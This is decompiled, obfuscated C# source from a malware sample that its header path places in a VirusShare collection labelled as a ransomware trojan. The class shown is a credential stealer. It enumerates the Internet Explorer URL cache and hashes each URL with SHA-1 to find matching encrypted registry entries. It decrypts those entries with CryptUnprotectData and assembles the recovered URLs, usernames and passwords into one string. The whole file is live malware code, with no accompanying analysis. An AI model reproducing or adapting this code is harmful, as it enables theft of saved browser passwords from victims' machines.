// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LLS, Version=2.24.9.7, Culture=neutral, PublicKeyToken=null
// MVID: 5D6D71DE-8D40-4460-ABF9-23365541871A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eaa908bb12fef0827442be70b4421db585c6c2d8b0ee62f8245856740ea6a776.exe

using \u0003\u000E;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;

namespace \u0003\u000E
{
  internal sealed class \u0012\u000E
  {
    public static string \u0001;
    public static readonly uint \u0002;
    public static readonly uint \u0003;
    public static readonly uint \u0004;
    public static readonly uint \u0005;
    public static string \u0006;
    public static string \u0007;

    static \u0012\u000E()
    {
      do
      {
        \u0012\u000E.\u0002 = 32771U;
      }
      while (false);
      int num1 = 26113;
      while (true)
      {
        \u0012\u000E.\u0003 = (uint) num1;
        int num2;
        do
        {
          num2 = 26114;
          if (num2 != 0)
          {
            \u0012\u000E.\u0004 = (uint) num2;
            \u0012\u000E.\u0005 = 26625U;
            \u0012\u000E.\u0006 = \u0007\u000E.\u0006\u000E(\u0008.\u0007(2814), \u0008.\u0007(217));
            \u0012\u000E.\u0007 = \u0008.\u0007(756);
          }
          else
            goto label_6;
        }
        while (false);
        break;
label_6:
        num1 = num2;
      }
    }

    [DllImport("advapi32.dll", EntryPoint = "CryptAcquireContext")]
    public static extern bool \u009A\u0002(
      [In] ref IntPtr obj0,
      [In] string obj1,
      [In] string obj2,
      [In] uint obj3,
      [In] uint obj4);

    [DllImport("advapi32.dll", EntryPoint = "CryptGetHashParam", SetLastError = true)]
    internal static extern bool \u009B\u0002(
      [In] IntPtr obj0,
      [In] int obj1,
      [In] byte[] obj2,
      [In] ref int obj3,
      [In] int obj4);

    [DllImport("advapi32.dll", EntryPoint = "CryptReleaseContext")]
    public static extern bool \u009C\u0002([In] IntPtr obj0, [In] uint obj1);

    [DllImport("advapi32.dll", EntryPoint = "CryptCreateHash")]
    public static extern bool \u009D\u0002(
      [In] IntPtr obj0,
      [In] uint obj1,
      [In] IntPtr obj2,
      [In] uint obj3,
      [In] ref IntPtr obj4);

    [DllImport("advapi32.dll", EntryPoint = "CryptHashData")]
    public static extern bool \u009E\u0002([In] IntPtr obj0, [In] IntPtr obj1, [In] int obj2, [In] uint obj3);

    [DllImport("advapi32.dll", EntryPoint = "CryptDestroyHash")]
    public static extern bool \u009F\u0002([In] IntPtr obj0);

    [DllImport("wininet.dll", EntryPoint = "FindFirstUrlCacheEntry", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr \u0001\u0003([MarshalAs(UnmanagedType.LPTStr)] string _param0, IntPtr _param1, ref int _param2);

    [DllImport("wininet.dll", EntryPoint = "FindNextUrlCacheEntry", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool \u0005\u0003([In] IntPtr obj0, [In] IntPtr obj1, [In] ref int obj2);

    [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool \u0006\u0003(
      [In] ref \u0012\u000E.\u0016\u00031 obj0,
      [In] int obj1,
      [In] ref \u0012\u000E.\u0016\u00031 obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] ref \u0012\u000E.\u0016\u00031 obj6);

    public static void \u0007\u0003()
    {
      RegistryKey registryKey = \u009A.\u007E\u008F\u0002((object) Registry.CurrentUser, \u0012\u000E.\u0006, true);
      if (true)
        goto label_32;
label_1:
      object obj;
      if (obj == null)
      {
        string[] strArray1 = new string[5];
        if (true)
          goto label_33;
label_3:
        string[] strArray2;
        strArray2[0] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(2923), \u0008.\u0007(217));
        strArray2[1] = \u0008.\u0007(822);
        strArray2[2] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(3053), \u0008.\u0007(217));
        strArray2[3] = \u0008.\u0007(822);
        strArray2[4] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(3086), \u0008.\u0007(217));
        \u0012\u000E.\u0001 = \u0012.\u0080(strArray2);
        return;
label_33:
        strArray2 = strArray1;
        goto label_3;
      }
      else
      {
        if (true)
          goto label_34;
label_5:
        if (true)
          goto label_35;
label_6:
        int num1;
        IntPtr num2 = \u0012\u000E.\u0001\u0003((string) null, IntPtr.Zero, ref num1);
        int num3;
        if (true)
        {
          if (\u009B.\u0090\u0002() == 259)
          {
            if (true)
              return;
          }
          else
          {
            int num4 = num1;
            if (true)
              num3 = num4;
          }
          num2 = \u009C.\u0092\u0002(num3);
        }
        if (true)
          goto label_37;
label_12:
        IntPtr num5;
        int num6;
        try
        {
          IntPtr num7 = \u0012\u000E.\u0001\u0003((string) null, num5, ref num1);
          bool flag;
          do
          {
            // ISSUE: type reference
            string str1 = ((\u0012\u000E.\u0015\u0003) \u009D.\u0094\u0002(num5, \u0017.\u0089(__typeref (\u0012\u000E.\u0015\u0003)))).\u0002;
            string str2 = \u0008.\u007E\u0014((object) str1);
            string str3 = \u0097.\u007E\u008B\u0002((object) str2, \u0096.\u007E\u008A\u0002((object) str2, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3228), \u0008.\u0007(217))) + 1);
            if (\u0096.\u007E\u008A\u0002((object) str3, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3237), \u0008.\u0007(217))) > 0)
              str3 = \u008A.\u007E\u001A\u0002((object) str3, 0, \u0096.\u007E\u008A\u0002((object) str3, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3237), \u0008.\u0007(217))));
            string str4 = \u0012\u000E.\u0008\u0003(str3, (\u0007.\u007E\u000E((object) str3) + 1) * 2);
            try
            {
              byte[] numArray1 = (byte[]) \u009F.\u007E\u0096\u0002((object) \u009E.\u007E\u0095\u0002((object) Registry.CurrentUser, \u0012\u000E.\u0006), str4, (object) null);
              if (numArray1 != null)
              {
                if (!\u0082.\u007E\u009E((object) \u0012\u000E.\u0007, str3))
                {
                  \u0012\u000E.\u000F\u0003(str3, str4, numArray1.Length, numArray1);
                  \u0012\u000E.\u0007 = \u0010.\u001F(\u0012\u000E.\u0007, str3, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3246), \u0008.\u0007(217)));
                }
              }
              else
              {
                string str5 = \u000F.\u001E(str3, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3255), \u0008.\u0007(217)));
                string str6 = \u0012\u000E.\u0008\u0003(str5, (\u0007.\u007E\u000E((object) str5) + 1) * 2);
                byte[] numArray2 = (byte[]) \u009F.\u007E\u0096\u0002((object) \u009E.\u007E\u0095\u0002((object) Registry.CurrentUser, \u0012\u000E.\u0006), str6, (object) null);
                if (numArray2 != null)
                {
                  if (!\u0082.\u007E\u009E((object) \u0012\u000E.\u0007, str5))
                  {
                    \u0012\u000E.\u000F\u0003(str5, str6, numArray2.Length, numArray2);
                    \u0012\u000E.\u0007 = \u0010.\u001F(\u0012\u000E.\u0007, str5, \u0008.\u0007(2111));
                  }
                }
              }
            }
            catch (Exception ex)
            {
              int lErl = num6;
              ProjectData.SetProjectError(ex, lErl);
              string[] strArray = new string[5]
              {
                \u0007\u000E.\u0006\u000E(\u0008.\u0007(2923), \u0008.\u0007(217)),
                \u0008.\u0007(822),
                \u0007\u000E.\u0006\u000E(\u0008.\u0007(3053), \u0008.\u0007(217)),
                \u0008.\u0007(822),
                \u0007\u000E.\u0006\u000E(\u0008.\u0007(3086), \u0008.\u0007(217))
              };
              \u0012\u000E.\u0001 = \u0012.\u0080(strArray);
              \u0014.\u0082();
              return;
            }
            int num8 = num3;
            flag = \u0012\u000E.\u0005\u0003(num7, num5, ref num8);
            if (!flag)
            {
              if (true)
              {
                if (\u009B.\u0090\u0002() == 259)
                  goto label_29;
              }
              else
                goto label_22;
            }
            if (!flag && num8 > num3)
            {
              num3 = num8;
              IntPtr num9 = new IntPtr(num3);
              num5 = \u0002\u0002.\u0098\u0002(num5, num9);
              flag = true;
            }
label_29:;
          }
          while (flag);
          goto label_38;
label_22:
          return;
label_38:
          return;
        }
        finally
        {
          \u0003\u0002.\u0099\u0002(num5);
        }
label_37:
        num5 = num2;
        goto label_12;
label_35:
        num1 = 0;
        goto label_6;
label_34:
        num6 = 2;
        goto label_5;
      }
label_32:
      obj = (object) registryKey;
      goto label_1;
    }

    public static string \u0008\u0003([In] string obj0, [In] int obj1)
    {
      string str1;
      try
      {
        byte[] numArray1 = new byte[21];
        if (true)
          goto label_12;
label_1:
        string str2 = \u0008.\u0007(756);
        if (true)
          goto label_13;
label_2:
        if (true)
          goto label_14;
label_3:
        IntPtr num1;
        \u0012\u000E.\u009A\u0002(ref num1, (string) null, (string) null, 1U, 0U);
        IntPtr num2;
        \u0012\u000E.\u009D\u0002(num1, 32772U, IntPtr.Zero, 0U, ref num2);
        IntPtr num3 = num2;
        IntPtr num4;
        while (true)
        {
          IntPtr num5 = \u0012\u000E.\u0010\u0003((object) obj0);
          int num6 = obj1;
          \u0012\u000E.\u009E\u0002(num3, num5, num6, 0U);
          num4 = num2;
          if (false)
            num3 = num4;
          else
            break;
        }
        byte[] numArray2;
        byte[] numArray3 = numArray2;
        int num7;
        ref int local = ref num7;
        \u0012\u000E.\u009B\u0002(num4, 2, numArray3, ref local, 0);
        \u0012\u000E.\u009F\u0002(num2);
        \u0012\u000E.\u009C\u0002(num1, 0U);
        if (true)
          goto label_15;
label_9:
        string str3;
        int index;
        while (index < 20)
        {
          string str4 = \u000F.\u001E(str3, \u0004\u0002.\u009A\u0002(\u000F.\u001E(\u0007\u000E.\u0006\u000E(\u0008.\u0007(3264), \u0008.\u0007(217)), numArray2[index].ToString(\u0007\u000E.\u0006\u000E(\u0008.\u0007(3273), \u0008.\u0007(217)))), 2));
          if (true)
            goto label_16;
label_8:
          int num8 = \u0006\u0002.\u009D\u0002(\u0005\u0002.\u009C\u0002(ref index), index - 1);
          continue;
label_16:
          str3 = str4;
          goto label_8;
        }
        \u000F obj2 = \u000F.\u001E;
        string str5 = str3;
        \u0004\u0002 obj3 = \u0004\u0002.\u009A\u0002;
        \u000F obj4 = \u000F.\u001E;
        string str6 = \u0007\u000E.\u0006\u000E(\u0008.\u0007(3264), \u0008.\u0007(217));
        int num9 = (int) \u0012\u000E.\u000E\u0003(str3);
        if (true)
          goto label_17;
label_11:
        byte num10;
        string str7 = num10.ToString(\u0007\u000E.\u0006\u000E(\u0008.\u0007(3273), \u0008.\u0007(217)));
        string str8 = obj4(str6, str7);
        string str9 = obj3(str8, 2);
        str1 = obj2(str5, str9);
        goto label_19;
label_17:
        num10 = (byte) num9;
        goto label_11;
label_15:
        index = 0;
        goto label_9;
label_14:
        num7 = 20;
        goto label_3;
label_13:
        str3 = str2;
        goto label_2;
label_12:
        numArray2 = numArray1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0014.\u0082();
      }
label_19:
      return str1;
    }

    public static byte \u000E\u0003([In] string obj0)
    {
      byte num1;
      try
      {
        int num2 = 0;
        if (num2 == 0)
        {
          if (true)
            goto label_10;
label_2:
          if (true)
            goto label_11;
label_6:
          int num3;
          int num4;
          while (num3 < \u0007.\u007E\u000E((object) obj0))
          {
            if (num3 % 2 != 0)
            {
              int num5 = num4 + \u000E\u0002.\u0001\u0003(\u0008\u0002.\u009F\u0002(\u000F.\u001E(\u0007\u000E.\u0006\u000E(\u0008.\u0007(3282), \u0008.\u0007(217)), \u0007\u0002.\u009E\u0002(obj0, num3, 2))));
              if (true)
                num4 = num5;
            }
            int num6 = \u0006\u0002.\u009D\u0002(\u0005\u0002.\u009C\u0002(ref num3), num3 - 1);
          }
          num2 = (int) \u0080.\u009C(num4 % 256);
          goto label_8;
label_11:
          num3 = 1;
          goto label_6;
label_10:
          num4 = num2;
          goto label_2;
        }
label_8:
        if (true)
          goto label_13;
label_9:
        byte num7;
        int num8 = (int) num7;
        if (true)
        {
          num1 = (byte) num8;
          goto label_16;
        }
        else
          goto label_16;
label_13:
        num7 = (byte) num2;
        goto label_9;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0014.\u0082();
      }
label_16:
      return num1;
    }

    public static void \u000F\u0003([In] string obj0, [In] string obj1, [In] int obj2, [In] byte[] obj3)
    {
      \u0012\u000E.\u0016\u00031 obj4 = new \u0012\u000E.\u0016\u00031();
      \u0012\u000E.\u0016\u00031 obj5 = new \u0012\u000E.\u0016\u00031();
      \u0012\u000E.\u0016\u00031 obj6 = new \u0012\u000E.\u0016\u00031();
      \u0012\u000E.\u0013\u0003 obj7 = new \u0012\u000E.\u0013\u0003();
      \u0012\u000E.\u0014\u0003 obj8 = new \u0012\u000E.\u0014\u0003();
      IntPtr num1 = \u009C.\u0092\u0002(obj2);
      if (true)
        goto label_22;
label_1:
      IntPtr num2;
      try
      {
        \u000F\u0002 obj9 = \u000F\u0002.\u0002\u0003;
        byte[] numArray = obj3;
        IntPtr num3 = num2;
        int num4 = obj2;
        if (true)
          goto label_3;
label_2:
        obj4.\u0001 = obj2;
        obj4.\u0002 = num2;
        obj6.\u0001 = (\u0007.\u007E\u000E((object) obj0) + 1) * 2;
        obj6.\u0002 = \u0012\u000E.\u0010\u0003((object) obj0);
        goto label_5;
label_3:
        obj9(numArray, 0, num3, num4);
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0014.\u0082();
      }
label_5:
      try
      {
        if (!\u0012\u000E.\u0006\u0003(ref obj4, 0, ref obj6, 0, 0, 0, ref obj5))
          return;
        IntPtr num5;
        ref IntPtr local1 = ref num5;
        int num6 = obj5.\u0002.ToInt32() + (int) \u0010\u0002.\u0003\u0003(obj5.\u0002);
        if (true)
          goto label_17;
label_7:
        \u0012\u000E.\u0013\u0003 obj10 = (\u0012\u000E.\u0013\u0003) \u009D.\u0094\u0002(num5, \u0011\u0002.\u007E\u0004\u0003((object) obj7));
        if (true)
          goto label_18;
label_8:
        if (obj7.\u0005 != 1 || obj7.\u0003 < 2)
          return;
        IntPtr num7;
        ref IntPtr local2 = ref num7;
        int num8 = num5.ToInt32() + obj7.\u0002;
        if (true)
          goto label_19;
label_10:
        IntPtr num9;
        ref IntPtr local3 = ref num9;
        int num10 = num7.ToInt32() + (obj7.\u0003 + 0) * \u0012\u0002.\u0005\u0003((object) obj8);
        if (true)
          goto label_20;
label_11:
        int num11 = 0;
        \u0012\u000E.\u0001 = \u0010.\u001F(\u0012\u000E.\u0001, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3291), \u0008.\u0007(217)), \u0008.\u0007(822));
        while ((double) num11 < (double) obj7.\u0003 / 2.0)
        {
          if (num11 != 0)
            num7 = new IntPtr(num7.ToInt32() + \u0012\u0002.\u0005\u0003((object) obj8));
          \u0012\u000E.\u0014\u0003 obj11 = (\u0012\u000E.\u0014\u0003) \u009D.\u0094\u0002(num7, \u0011\u0002.\u007E\u0004\u0003((object) obj8));
          IntPtr num12 = new IntPtr(num9.ToInt32() + obj11.\u0001);
          string str1 = \u0013\u0002.\u0007\u0003(num12);
          num7 = new IntPtr(num7.ToInt32() + \u0012\u0002.\u0005\u0003((object) obj11));
          obj8 = (\u0012\u000E.\u0014\u0003) \u009D.\u0094\u0002(num7, \u0011\u0002.\u007E\u0004\u0003((object) obj11));
          num12 = new IntPtr(num9.ToInt32() + obj8.\u0001);
          string str2 = \u0013\u0002.\u0007\u0003(num12);
          \u0012\u000E.\u0001 = \u0014\u0002.\u0008\u0003(\u0012\u000E.\u0001, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3372), \u0008.\u0007(217)), obj0, \u0008.\u0007(848));
          \u0012\u000E.\u0001 = \u0014\u0002.\u0008\u0003(\u0012\u000E.\u0001, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3385), \u0008.\u0007(217)), str1, \u0008.\u0007(848));
          \u0012\u000E.\u0001 = \u0014\u0002.\u0008\u0003(\u0012\u000E.\u0001, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3410), \u0008.\u0007(217)), str2, \u0008.\u0007(848));
          \u0012\u000E.\u0001 = \u000F.\u001E(\u0012\u000E.\u0001, \u0008.\u0007(848));
          int num13 = \u0006\u0002.\u009D\u0002(\u0005\u0002.\u009C\u0002(ref num11), num11 - 1);
        }
        \u0012\u000E.\u0001 = \u000F.\u001E(\u0012\u000E.\u0001, \u0007\u000E.\u0006\u000E(\u0008.\u0007(3435), \u0008.\u0007(217)));
        return;
label_20:
        local3 = new IntPtr(num10);
        goto label_11;
label_19:
        local2 = new IntPtr(num8);
        goto label_10;
label_18:
        obj7 = obj10;
        goto label_8;
label_17:
        local1 = new IntPtr(num6);
        goto label_7;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0014.\u0082();
        return;
      }
label_22:
      num2 = num1;
      goto label_1;
    }

    public static IntPtr \u0010\u0003([In] object obj0)
    {
      IntPtr num1;
      try
      {
        GCHandle gcHandle1 = \u0088.\u0018\u0002(\u0005.\u0006(obj0), GCHandleType.Pinned);
        if (true)
          goto label_3;
label_1:
        GCHandle gcHandle2;
        do
        {
          IntPtr num2 = gcHandle2.AddrOfPinnedObject();
          if (true)
            goto label_4;
label_2:
          continue;
label_4:
          num1 = num2;
          goto label_2;
        }
        while (false);
        goto label_9;
label_3:
        gcHandle2 = gcHandle1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          if (true)
            \u0014.\u0082();
        }
        while (false);
      }
label_9:
      return num1;
    }

    public static string \u0011\u0003([In] string obj0, [In] int obj1, [In] int obj2)
    {
      string str1;
      try
      {
        do
        {
          string str2 = \u008A.\u007E\u001A\u0002((object) obj0, obj1, obj2);
          if (true)
            goto label_3;
label_1:
          string str3;
          string str4 = str3;
          if (true)
            goto label_4;
label_2:
          continue;
label_4:
          str1 = str4;
          goto label_2;
label_3:
          str3 = str2;
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          if (true)
            \u0014.\u0082();
        }
        while (false);
      }
      return str1;
    }

    public struct \u0013\u0003
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
      public int \u0006;
    }

    public struct \u0014\u0003
    {
      public int \u0001;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u0002;
      public int \u0003;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct \u0015\u0003
    {
      public int \u0001;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string \u0002;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string \u0003;
      public int \u0004;
      public int \u0005;
      public int \u0006;
      public int \u0007;
      public int \u0008;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u000E;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u000F;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u0010;
      public System.Runtime.InteropServices.ComTypes.FILETIME \u0011;
      public IntPtr \u0012;
      public int \u0013;
      public IntPtr \u0014;
      public int \u0015;
    }

    private struct \u0016\u00031
    {
      public int \u0001;
      public IntPtr \u0002;
    }
  }
}
